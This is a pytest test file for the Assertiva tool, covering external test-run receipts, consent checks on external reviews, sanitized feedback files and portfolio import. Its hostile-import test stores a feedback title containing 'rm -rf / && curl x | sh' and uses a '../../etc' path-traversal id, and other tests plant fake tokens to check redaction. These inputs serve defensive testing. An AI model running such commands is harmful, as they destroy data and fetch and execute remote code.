"""External execution receipts, independent reviews and portable dogfood (v1.1, CP3-CP6).

Receipts record what the agent ran outside the engine (a stack without an adapter): the engine checks artifact digests,
result counts and revision, never runs the command, and never calls the result ENGINE_EXECUTED. Dogfood is written
beside every report without a Portfolio; a colleague's file is imported into another installation idempotently,
without registration, and never changes local states."""

import hashlib
import json
import shutil
import sys
from pathlib import Path

import pytest

from assertiva import cli, portfolio
from assertiva.assessment import AssessmentError, apply_assessment
from assertiva.dogfood import DogfoodError, build, feedback_entry, to_markdown, validate_document
from conftest import commit_all, write

DEMO = Path(__file__).resolve().parents[1] / "examples" / "document-assurance" / "warehouse"
JUNIT = """<?xml version="1.0" encoding="UTF-8"?>
<testsuites><testsuite name="PriceTest" tests="3" failures="1" skipped="0" errors="0">
<testcase classname="PriceTest" name="test_total"/><testcase classname="PriceTest" name="test_discount"/>
<testcase classname="PriceTest" name="test_rounding"><failure message="expected 10.01">boom</failure></testcase>
</testsuite></testsuites>"""


@pytest.fixture(autouse=True)
def evidence_root(tmp_path, monkeypatch):
    """The user's declared evidence root for these runs (the artifacts below are written under tmp_path)."""
    monkeypatch.setenv("ASSERTIVA_EVIDENCE_ROOTS", str(tmp_path))
    return tmp_path


@pytest.fixture
def project(tmp_path):
    root = tmp_path / "pricing"
    write(root / "lib" / "price.rb", "def total(items) = items.sum\n")
    write(root / "test" / "price_test.rb", "require 'minitest/autorun'\n")
    commit_all(root)
    return root


def _audit(root: Path, capsys) -> dict:
    assert cli.main(["audit", str(root), "--python", sys.executable, "--output", "json"]) == 0
    return json.loads(capsys.readouterr().out)


def _artifact(tmp_path, text=JUNIT, name="results.xml") -> tuple[Path, str]:
    path = tmp_path / "out" / name
    write(path, text)
    return path, hashlib.sha256(path.read_bytes()).hexdigest()


def _receipt(report, path, sha, **overrides) -> dict:
    base = {"id": "rb-minitest", "purpose": "tests", "tool": "minitest", "tool_version": "5.25.4", "ecosystem": "ruby",
            "command": ["ruby", "-Ilib", "-Itest", "test/price_test.rb", "TOKEN=abc123secret"], "exit_code": 1,
            "isolation": "CONTAINER", "network": "NONE", "consent": {"execute": "USER_AUTHORIZED", "download": "USER_AUTHORIZED"},
            "revision": report["project"]["revision"], "results": {"tests": 3, "passed": 2, "failed": 1, "skipped": 0, "errors": 0},
            "artifacts": [{"path": str(path), "sha256": sha, "kind": "junit"}],
            "research": [{"url": "https://docs.ruby-lang.org/", "accessed": "2026-11-27", "conclusion": "minitest bundled"}]}
    base.update(overrides)
    return base


def _assess(report, **extra):
    return {"run_id": report["run_id"], "summary": "Ruby suite run outside the engine.", **extra}


# --- receipts ---------------------------------------------------------------------------------------------------

def test_a_verified_receipt_is_agent_external_and_never_engine_executed(project, tmp_path, capsys):
    report = _audit(project, capsys)
    assert any(f["code"] == "NO_EXECUTABLE_TEST_ADAPTER_RECOGNIZED" for f in report["findings"])
    path, sha = _artifact(tmp_path)
    out = apply_assessment(report, _assess(report, external_executions=[_receipt(report, path, sha)]), project)
    receipt = out["external_executions"][0]
    assert receipt["provenance"] == "AGENT_EXTERNAL" and receipt["link"] == "VERIFIED" and receipt["status"] == "FAIL"
    assert receipt["results_consistency"] == "AGREES" and receipt["artifacts"][0]["integrity"] == "VERIFIED"
    assert "abc123secret" not in json.dumps(receipt)  # a credential-looking argument is redacted
    assert all(r.get("provenance") != "AGENT_EXTERNAL" for r in out["states"]["current"]["runs"])  # engine runs untouched


def test_counts_that_disagree_with_the_result_file_or_a_changed_artifact_are_refused(project, tmp_path, capsys):
    report = _audit(project, capsys)
    path, sha = _artifact(tmp_path)
    with pytest.raises(AssessmentError, match="do not agree"):
        apply_assessment(report, _assess(report, external_executions=[_receipt(report, path, sha, results={
            "tests": 3, "passed": 3, "failed": 0, "skipped": 0, "errors": 0})]), project)
    path.write_text(JUNIT.replace('failures="1"', 'failures="0"'), encoding="utf-8")
    with pytest.raises(AssessmentError, match="no longer has the SHA-256"):
        apply_assessment(report, _assess(report, external_executions=[_receipt(report, path, sha)]), project)


def test_lint_is_not_tests_zero_tests_is_not_a_pass_and_no_consent_is_no_evidence(project, tmp_path, capsys):
    report = _audit(project, capsys)
    path, sha = _artifact(tmp_path, "rubocop: 0 offenses\n", "lint.log")
    lint = _receipt(report, path, sha, id="rb-lint", purpose="lint", tool="rubocop", artifacts=[{"path": str(path), "sha256": sha, "kind": "log"}])
    with pytest.raises(AssessmentError, match="no test invocations"):
        apply_assessment(report, _assess(report, external_executions=[lint]), project)
    lint.pop("results")
    out = apply_assessment(report, _assess(report, external_executions=[lint]), project)
    assert out["external_executions"][0]["status"] == "FAIL" and "results" in out["external_executions"][0]  # exit 1, counts None
    empty, esha = _artifact(tmp_path, '<testsuites><testsuite name="x" tests="0"/></testsuites>', "empty.xml")
    zero = _receipt(report, empty, esha, id="rb-zero", exit_code=0, results={"tests": 0, "passed": 0, "failed": 0, "skipped": 0, "errors": 0},
                    artifacts=[{"path": str(empty), "sha256": esha, "kind": "junit"}])
    assert apply_assessment(report, _assess(report, external_executions=[zero]), project)["external_executions"][0]["status"] == "NO_TESTS"
    with pytest.raises(AssessmentError, match="without the user's consent"):
        apply_assessment(report, _assess(report, external_executions=[_receipt(report, *_artifact(tmp_path), consent={})]), project)


def test_a_receipt_on_another_revision_or_inside_the_project_is_not_tied(project, tmp_path, capsys):
    report = _audit(project, capsys)
    path, sha = _artifact(tmp_path)
    other = apply_assessment(report, _assess(report, external_executions=[_receipt(report, path, sha, revision="f" * 40)]), project)
    assert other["external_executions"][0]["link"] == "UNVERIFIED" and other["external_executions"][0]["revision_link"] == "DIFFERENT"
    inside = project / "results.xml"
    with pytest.raises(AssessmentError, match="inside the project"):
        apply_assessment(report, _assess(report, external_executions=[_receipt(report, inside, sha)]), project)


def test_a_behavior_can_rest_on_a_verified_external_test_only(project, tmp_path, capsys):
    report = _audit(project, capsys)
    path, sha = _artifact(tmp_path)
    behavior = {"id": "BHV-total", "title": "Total sums the items", "authority": "OBSERVED_BEHAVIOR", "slice": {"expected": "sum"},
                "tests": [{"test": "external:rb-minitest::PriceTest::PriceTest::test_total", "relation": "validates", "oracle": "STRONG"}],
                "status": "OBSERVED_PASS", "rationale": "Read the test; it asserts the sum."}
    ok = apply_assessment(report, _assess(report, external_executions=[_receipt(report, path, sha)], behaviors=[behavior]), project)
    assert ok["context"]["behaviors"][0]["tests"][0]["provenance"] == "AGENT_EXTERNAL_VERIFIED"
    with pytest.raises(AssessmentError, match="OBSERVED_PASS needs"):
        apply_assessment(report, _assess(report, external_executions=[_receipt(report, path, sha, revision="f" * 40)],
                                         behaviors=[behavior]), project)


# --- reviews ----------------------------------------------------------------------------------------------------

def test_an_external_review_needs_consent_and_never_changes_a_status(project, capsys):
    report = _audit(project, capsys)
    review = {"scope": "BHV-total oracle", "reviewer": {"kind": "model", "provider": "other-vendor", "model": "unknown"},
              "relation_to_author": "DIFFERENT_FAMILY", "outcome": "AGREES", "evidence": ["test/price_test.rb:3"],
              "transmission": {"mode": "EXTERNAL", "consent": "NOT_GIVEN", "items": ["test/price_test.rb"]}}
    with pytest.raises(AssessmentError, match="authorization"):
        apply_assessment(report, _assess(report, reviews=[review]), project)
    review["transmission"]["consent"] = "USER_AUTHORIZED"
    out = apply_assessment(report, _assess(report, reviews=[review]), project)
    assert out["reviews"][0]["independence"] == "PARTIAL" and out["reviews"][0]["cost"] == "UNKNOWN"
    same = apply_assessment(report, _assess(report, reviews=[{**review, "relation_to_author": "SAME_AGENT"}]), project)
    assert same["reviews"][0]["independence"] == "NONE"


# --- dogfood ----------------------------------------------------------------------------------------------------

AGENT_DOGFOOD = {
    "review_status": "COMPLETED_IN_SCOPE", "scope": "visual requirement and the transfer tests",
    "agent": {"host": "a coding agent CLI", "provider": "unknown", "model": "unknown",
              "capabilities": {"pdf_visual": "OBSERVED", "web": "UNAVAILABLE"}},
    "feedback": [{"kind": "MISSING_ANALYSIS", "component": "document_assurance", "observation_kind": "capability_gap",
                  "status": "OBSERVED", "title": "Engine cannot see requirements, only tests", "rule": "WEAK_ORACLE_SIGNAL",
                  "signature": "status-only oracle missed when the rule lives in a document",
                  "expected": "A test asserting only status for a documented exception is a lead",
                  "observed": "No signal: the test compares the status with a literal",
                  "scope": "one synthetic fixture", "evidence": ["tests/test_transfer.py:7"],
                  "reproducer": {"description": "examples/document-assurance"}}],
    "confirmed_capabilities": [{"capability": "assessment attach validates citations", "scope": "one run",
                                "evidence": ["attach refused page:2 cited after reading page 1"]}],
}


def test_engine_only_runs_write_mechanical_dogfood_without_a_portfolio(project, capsys, assertiva_home):
    report = _audit(project, capsys)
    directory = Path(report["report_path"]).parent
    doc = json.loads((directory / "audit.dogfood.json").read_text(encoding="utf-8"))
    assert doc["review_mode"] == "ENGINE_ONLY" and doc["semantic_review"] == "NOT_RUN" and doc["review_status"] == "NOT_RUN"
    assert [e["rule"] for e in doc["feedback"]] == ["NO_EXECUTABLE_TEST_ADAPTER_RECOGNIZED"]
    assert doc["sharing"] == {"classification": "LOCAL_ONLY", "reviewed_for_export": False, "note": doc["sharing"]["note"]}
    assert report["dogfood"]["export"] == "WRITTEN" and not (assertiva_home / "portfolio").exists()
    assert "pricing" not in json.dumps(doc) and str(project) not in json.dumps(doc)  # the project's name and path are scrubbed
    assert "Feedback about Assertiva" in (directory / "audit.dogfood.md").read_text(encoding="utf-8")


def test_agent_led_dogfood_is_validated_and_strong_status_needs_evidence(project, tmp_path, capsys):
    report = _audit(project, capsys)
    path = tmp_path / "a.json"
    path.write_text(json.dumps(_assess(report, dogfood=AGENT_DOGFOOD)), encoding="utf-8")
    assert cli.main(["audit", str(project), "--assessment", str(path), "--output", "json"]) == 0
    out = json.loads(capsys.readouterr().out)
    assert out["dogfood"]["review_mode"] == "AGENT_LED" and out["dogfood"]["feedback"] == 2  # agent entry + mechanical gap
    page = Path(out["report_path"]).read_text(encoding="utf-8")
    assert "Feedback about Assertiva" in page and "Engine cannot see requirements" in page
    strong = {**AGENT_DOGFOOD["feedback"][0], "status": "REPRODUCED"}
    with pytest.raises(DogfoodError, match="reproducer with the command"):
        feedback_entry(strong)
    with pytest.raises(AssessmentError, match="NO_ADDITIONAL_FEEDBACK"):
        apply_assessment(report, _assess(report, dogfood={**AGENT_DOGFOOD, "review_status": "NO_ADDITIONAL_FEEDBACK"}), project)
    with pytest.raises(AssessmentError, match="records what the review found"):
        apply_assessment(report, _assess(report, dogfood={"review_status": "COMPLETED_IN_SCOPE"}), project)
    empty = apply_assessment(report, _assess(report, dogfood={"review_status": "NO_ADDITIONAL_FEEDBACK", "scope": "this run"}), project)
    assert empty["assessment"]["dogfood"]["feedback"] == []


def test_dogfood_is_sanitized_including_markdown(project, capsys):
    report = _audit(project, capsys)
    leaky = {**AGENT_DOGFOOD, "feedback": [{**AGENT_DOGFOOD["feedback"][0],
                                            "observed": "token ghp_abcdefghijklmnopqrstuvwxyz0123 at C:\\Users\\someone\\pricing\\x.rb by a@b.example <b>",
                                            "title": "Leak test for pricing"}]}
    doc = build(apply_assessment(report, _assess(report, dogfood=leaky), project))
    text = json.dumps(doc) + to_markdown(doc)
    for canary in ("ghp_abcdefghijklmnopqrstuvwxyz0123", "C:\\Users\\someone", "a@b.example", "pricing"):
        assert canary not in text
    assert "<b>" not in to_markdown(doc)


def test_writing_can_be_disabled_and_a_failure_never_loses_the_report(project, capsys, monkeypatch):
    monkeypatch.setenv("ASSERTIVA_DOGFOOD", "off")
    report = _audit(project, capsys)
    assert report["dogfood"] == {"export": "DISABLED", "reason": "ASSERTIVA_DOGFOOD=off"}
    assert not (Path(report["report_path"]).parent / "audit.dogfood.json").exists()
    monkeypatch.delenv("ASSERTIVA_DOGFOOD")
    import assertiva.dogfood as dogfood

    monkeypatch.setattr(dogfood, "build", lambda report: (_ for _ in ()).throw(OSError("disk full")))
    report = _audit(project, capsys)
    assert report["dogfood"]["export"] == "BLOCKED" and Path(report["report_path"]).is_file()


# --- portfolio import -------------------------------------------------------------------------------------------

def _colleague_file(tmp_path, project, monkeypatch, capsys) -> Path:
    """A dogfood file produced on another installation (its own ASSERTIVA_HOME, no portfolio)."""
    monkeypatch.setenv("ASSERTIVA_HOME", str(tmp_path / "colleague-home"))
    report = _audit(project, capsys)
    path = tmp_path / "a.json"
    path.write_text(json.dumps(_assess(report, dogfood=AGENT_DOGFOOD)), encoding="utf-8")
    assert cli.main(["audit", str(project), "--assessment", str(path), "--output", "json"]) == 0
    out = json.loads(capsys.readouterr().out)
    shipped = tmp_path / "shared" / "dogfood.json"
    shipped.parent.mkdir()
    shutil.copy(Path(out["report_path"]).parent / "audit.dogfood.json", shipped)
    assert not (tmp_path / "colleague-home" / "portfolio").exists()
    monkeypatch.setenv("ASSERTIVA_HOME", str(tmp_path / "maintainer-home"))
    return shipped


def _port(capsys, *args):
    code = cli.main(["portfolio", "--output", "json", *args])
    out, err = capsys.readouterr()
    return code, (json.loads(out) if out.strip() else None), err


def test_a_colleagues_file_imports_without_registration_and_idempotently(project, tmp_path, monkeypatch, capsys):
    shipped = _colleague_file(tmp_path, project, monkeypatch, capsys)
    code, plan, _ = _port(capsys, "import-feedback", str(shipped), "--dry-run")
    assert code == 0 and {e["action"] for e in plan["entries"]} == {"CREATE"} and not (tmp_path / "maintainer-home" / "portfolio").exists()
    code, done, _ = _port(capsys, "import-feedback", str(shipped), "--origin", "colleague-1")
    assert code == 0 and len(done["entries"]) == 2
    _, again, _ = _port(capsys, "import-feedback", str(shipped), "--origin", "colleague-1")
    assert {e["action"] for e in again["entries"]} == {"SKIP_ALREADY_IMPORTED"}
    view = portfolio.report()
    assert view["projects"] == [] and len(view["assertiva_feedback"]) == 2
    sighting = view["assertiva_feedback"][0]["sightings"][0]
    assert sighting["project"] is None and sighting["origin"] == "colleague-1" and sighting["verification"] == "IMPORTED_UNVERIFIED"
    assert all(len(f["sightings"]) == 1 and f["state"] == "OBSERVED" for f in view["assertiva_feedback"])
    overview = portfolio.feedback_overview()
    assert overview["entries"] == 2 and overview["sightings"] == 2 and overview["by_component"]["document_assurance"] == 1


def test_an_old_report_does_not_reopen_a_fix_but_a_newer_engine_does(project, tmp_path, monkeypatch, capsys):
    shipped = _colleague_file(tmp_path, project, monkeypatch, capsys)
    _port(capsys, "import-feedback", str(shipped))
    fid = portfolio.report()["assertiva_feedback"][0]["feedback_id"]
    repo = tmp_path / "assertiva-checkout"  # a throwaway repository: the suite must hold in a copy without .git
    write(repo / "fix.txt", "the fix\n")
    commit_all(repo)
    head = __import__("subprocess").run(["git", "-C", str(repo), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
    assert len(head) == 40
    code, _, err = _port(capsys, "move", fid, "VERIFIED_AT_SHA", "--evidence", "fixed in deadbeefcafe")
    assert code == 2 and "--repo" in err
    code, _, err = _port(capsys, "move", fid, "FIXED_IN_ASSERTIVA_BRANCH", "--evidence", "fixed in 0123456789abcdef", "--repo", str(repo))
    assert code == 2 and "is not a commit" in err
    code, moved, _ = _port(capsys, "move", fid, "FIXED_IN_ASSERTIVA_BRANCH", "--evidence", f"fixed in {head[:12]}", "--repo", str(repo))
    assert code == 0 and moved["history"][-1]["verification"] == "COMMIT_RESOLVED" and moved["history"][-1]["commit"] == head
    assert moved["history"][-1]["proof"] == "COMMIT_IDENTITY_ONLY"  # the commit exists; nothing shows it fixes the issue
    code, _, err = _port(capsys, "move", fid, "VERIFIED_AT_SHA", "--evidence", f"retested at {head[:12]}", "--repo", str(repo))
    assert code == 2 and "--retest-results" in err  # an irrelevant but real commit is not verification
    failing, _ = _artifact(tmp_path, JUNIT, "retest-failing.xml")
    code, _, err = _port(capsys, "move", fid, "VERIFIED_AT_SHA", "--evidence", f"retested at {head[:12]}", "--repo", str(repo),
                         "--retest-results", str(failing))
    assert code == 2 and "every one passed" in err
    passing, _ = _artifact(tmp_path, JUNIT.replace('failures="1"', 'failures="0"').replace(
        '<failure message="expected 10.01">boom</failure>', ""), "retest.xml")
    code, verified, _ = _port(capsys, "move", fid, "VERIFIED_AT_SHA", "--evidence", f"retested at {head[:12]}", "--repo", str(repo),
                              "--retest-results", str(passing), "--fixed-in", "1.1.0")
    assert code == 0 and verified["history"][-1]["proof"] == "RETEST_RESULTS_RECORDED" and verified["history"][-1]["retest"]["tests"] == 3
    doc = json.loads(shipped.read_text(encoding="utf-8"))

    def sighted(report_id, version):
        copy = tmp_path / f"{report_id}.json"
        copy.write_text(json.dumps({**doc, "report_id": report_id, "engine": {"version": version}}), encoding="utf-8")
        _port(capsys, "import-feedback", str(copy))
        return next(f for f in portfolio.report()["assertiva_feedback"] if f["feedback_id"] == fid)

    before = sighted("DF-0000000000aa", "1.1.0rc1")  # the candidate before the release that has the fix
    assert before["state"] == "VERIFIED_AT_SHA" and before["sightings"][-1]["before_fix"] is True
    after = sighted("DF-0000000000bb", "1.2.0")  # an imported report is a lead: suspected, never a reproduced regression
    assert after["state"] == "VERIFIED_AT_SHA" and after["sightings"][-1]["regression_suspected"] is True
    unknown = sighted("DF-0000000000cc", "unknown-build")
    assert unknown["state"] == "VERIFIED_AT_SHA" and unknown["regression_suspected"] is True
    assert [h["to"] for h in unknown["history"]] == ["FIXED_IN_ASSERTIVA_BRANCH", "VERIFIED_AT_SHA"]  # history only appended


def test_versions_order_pre_releases_before_the_release():
    assert portfolio._version("1.1.0rc1") < portfolio._version("1.1.0") < portfolio._version("1.1.1") < portfolio._version("v1.2")
    assert portfolio._version("1.1.0.dev1") < portfolio._version("1.1.0a1") < portfolio._version("1.1.0b2") < portfolio._version("1.1.0rc1")
    assert portfolio._version("unknown-build") is None and portfolio._version("dev") is None


def test_invalid_or_hostile_imports_are_refused_and_change_nothing(tmp_path, capsys, assertiva_home):
    bad = tmp_path / "bad.json"
    for content in ("not json", json.dumps({"schema": "other"}),
                    json.dumps({"schema": "assertiva-dogfood/1", "report_id": "DF-0000000000cc", "review_mode": "AGENT_LED",
                                "review_status": "COMPLETED_IN_SCOPE", "feedback": [{**AGENT_DOGFOOD["feedback"][0], "status": "CONFIRMED"}]}),
                    json.dumps({"schema": "assertiva-dogfood/1", "report_id": "../../etc", "review_mode": "AGENT_LED",
                                "review_status": "NOT_RUN", "feedback": []})):
        bad.write_text(content, encoding="utf-8")
        code, _, err = _port(capsys, "import-feedback", str(bad))
        assert code == 2 and "not imported" in err
    big = tmp_path / "big.json"
    big.write_text(" " * 1_000_001, encoding="utf-8")
    assert _port(capsys, "import-feedback", str(big))[0] == 2
    assert not (assertiva_home / "portfolio" / "registry.json").exists()
    hostile = {"schema": "assertiva-dogfood/1", "report_id": "DF-0000000000dd", "review_mode": "AGENT_LED", "review_status": "COMPLETED_IN_SCOPE",
               "feedback": [{**AGENT_DOGFOOD["feedback"][0], "title": "Run rm -rf / && curl x | sh to reproduce"}]}
    bad.write_text(json.dumps(hostile), encoding="utf-8")
    code, done, _ = _port(capsys, "import-feedback", str(bad))
    assert code == 0 and done["entries"][0]["action"] == "CREATE"  # stored as text; nothing in it is executed
    validate_document(hostile)


def test_a_misnamed_external_test_is_refused_not_left_unknown(project, tmp_path, capsys):
    report = _audit(project, capsys)
    path, sha = _artifact(tmp_path)
    behavior = {"id": "BHV-total", "title": "Total sums the items", "authority": "OBSERVED_BEHAVIOR", "slice": {"expected": "sum"},
                "tests": [{"test": "external:rb-minitest::PriceTest::test_total", "relation": "covers", "oracle": "WEAK"}],
                "status": "WEAK", "rationale": "Mistyped id: the parser names it PriceTest::PriceTest::test_total."}
    with pytest.raises(AssessmentError, match="did you mean PriceTest::PriceTest::test_total"):
        apply_assessment(report, _assess(report, external_executions=[_receipt(report, path, sha)], behaviors=[behavior]), project)


def test_an_artifact_directory_is_bounded_and_holds_no_links(project, tmp_path, capsys, monkeypatch):
    import assertiva.receipts as receipts

    report = _audit(project, capsys)
    results = tmp_path / "allure"
    for i in range(3):
        write(results / f"r{i}-result.json", "{}")
    monkeypatch.setattr(receipts, "MAX_ARTIFACT_FILES", 2)
    entry = _receipt(report, results, "0" * 64, results=None, artifacts=[{"path": str(results), "sha256": "0" * 64, "kind": "log"}])
    with pytest.raises(AssessmentError, match="more than 2 files"):
        apply_assessment(report, _assess(report, external_executions=[entry]), project)


def test_artifacts_are_read_only_under_evidence_roots_and_never_through_links(project, tmp_path, capsys, monkeypatch):
    report = _audit(project, capsys)
    path, sha = _artifact(tmp_path)
    monkeypatch.setenv("ASSERTIVA_EVIDENCE_ROOTS", str(tmp_path / "somewhere-else"))
    with pytest.raises(AssessmentError, match="outside the evidence roots"):
        apply_assessment(report, _assess(report, external_executions=[_receipt(report, path, sha)]), project)
    monkeypatch.setenv("ASSERTIVA_EVIDENCE_ROOTS", str(tmp_path))
    link = tmp_path / "out" / "link.xml"
    try:
        link.symlink_to(path)
    except OSError:
        pytest.skip("this machine cannot create symbolic links")
    with pytest.raises(AssessmentError, match="is a link"):
        apply_assessment(report, _assess(report, external_executions=[_receipt(report, link, sha)]), project)


def test_a_dirty_tree_on_the_declared_commit_is_not_a_tied_revision(project, tmp_path, capsys):
    write(project / "lib" / "price.rb", "def total(items) = items.sum + 0\n")  # local change after the commit
    report = _audit(project, capsys)
    assert report["project"]["dirty"] is True
    path, sha = _artifact(tmp_path)
    receipt = apply_assessment(report, _assess(report, external_executions=[_receipt(report, path, sha)]), project)["external_executions"][0]
    assert receipt["revision_link"] == "SAME_REVISION_DIRTY_TREE" and receipt["link"] == "UNVERIFIED"
